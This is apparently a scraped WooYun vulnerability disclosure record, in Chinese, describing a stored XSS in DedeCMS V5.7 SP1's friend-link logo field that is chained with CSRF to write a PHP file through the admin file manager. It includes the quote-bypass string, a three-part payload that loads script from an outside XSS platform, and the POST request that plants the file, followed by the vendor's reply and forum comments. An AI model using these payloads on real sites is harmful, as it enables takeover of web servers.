{"id": 1323, "wybug_id": "wooyun-2014-065561", "wybug_title": "DedeCMS-V5.7-UTF8-SP1 csrf getshell 无需会员中心", "wybug_corp": "Dedecms", "wybug_author": "索马里的海贼", "wybug_date": "2014-06-20 09:29", "wybug_open_date": "2014-09-18 09:30", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向公众公开  简要描述： 最近csrf又火了哈，各种csrf脱裤。dede后台挺方便就直接写getshell了一直在白盒今天试试黑盒 结果发现了这个问题不用注册，3条请求getshell测试版本号 20140612  详细说明：  在黑盒测试友情链接功能的时候发现filter的一个bug网站logo处提交\">_<'&quot;&lt;&gt;发现后台显示logo时居然成功引入了双引号闭合了src属性。\n\n经过多次测试发现 只要单引号后面跟&quot;就能成功闭合双引号于是提交测试代码\n'&quot; onerror=alert(1);//\n\n\n\n\n成功弹出了alert   漏洞证明：  先用xss平台创建一个项目，然后自定义代码这里用的pkav的post get模块 post \nhttp://192.168.1.114/dede/file_manage_control.php\ndata \nfmdo=edit&backurl=&activepath=&filename=csrf.php&str=%3C%3Fphp+phpinfo%28%29%3B%3F%3E&B1=++%E4%BF%9D+%E5%AD%98++\n因为此处字符长度有限制所以将payload拆分为3段 分别提交\n'&quot; onerror=s.src='http://xss平台/KCfTiA';//\n\n'&quot; onerror=body.appendChild(s);//\n\n'&quot; onerror=s=createElement('script');//\n注意显示的顺序与提交的顺序是相反的 所以要把payload顺序倒过来提交完后访问后台友情链接模块\n\n可以看到访问了js 然后访问了file_manage_control.php文件管理可以看到shell已经躺在目录里了\n\n   修复方案：  xss 过滤器   版权声明：转载请注明来源 索马里的海贼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-06-23 18:22 厂商回复： 已经修复，感谢提交。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-20 09:31 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  csrf的奥秘不在于技术 而在于交互 discuz天生就是交互 dedecms就呵呵了    \n     2014-06-20 09:38 |    \t\t小葵 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:11        | 我们是害虫，我们是害虫！)\t\t \n  呵呵，如果管理员一年不上呢？    \n     2014-06-20 09:54 |    \t\tquanxian \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:2        | This is QuanXian.)\t\t \n  @小葵 正解。。X母校网站，几个月过去了，文章一直没有审核。。    \n     2014-06-20 10:14 |    \t\tmu0u \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 先做人，后做事。)\t\t \n  @小葵 那种站应该也没什么价值吧。    \n     2014-06-20 11:20 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  三条请求。那不跟以前鬼哥放出来的那个差不多？坐等公布。    \n     2014-06-20 14:47 |    \t\tp4ssw0rd \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:92        | 不作死就不会死)\t\t \n  mark    \n     2014-06-20 16:00 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  关注！！    \n     2014-06-23 20:48 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  - -应该还是审核文章那块。价值不是很大    \n     2014-06-23 22:22 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @大白菜 不需要会员中心哪来的审核文章啊    \n     2014-06-23 22:37 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  @索马里的海贼 - -我看错了，楼上说的文章审核那块。。我以为是那块呢，    友情连接申请那块吧？ 别的地方基本少了    \n     2014-06-26 18:28 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  @索马里的海贼 直接公布吧。等不下去了。    \n     2014-08-05 12:16 |    \t\t网络流氓 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 欢迎热爱网络安全的朋友技术交流QQ:1020471...)\t\t \n  我以为直接前台直接打呢。。。。。。。    \n     2014-09-09 19:35 |    \t\tpigzhu \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 网络共享！)\t\t \n  后台找不到呢。。。    \n     2014-09-20 21:13 |    \t\tMxx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 没有)\t\t \n  马克。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}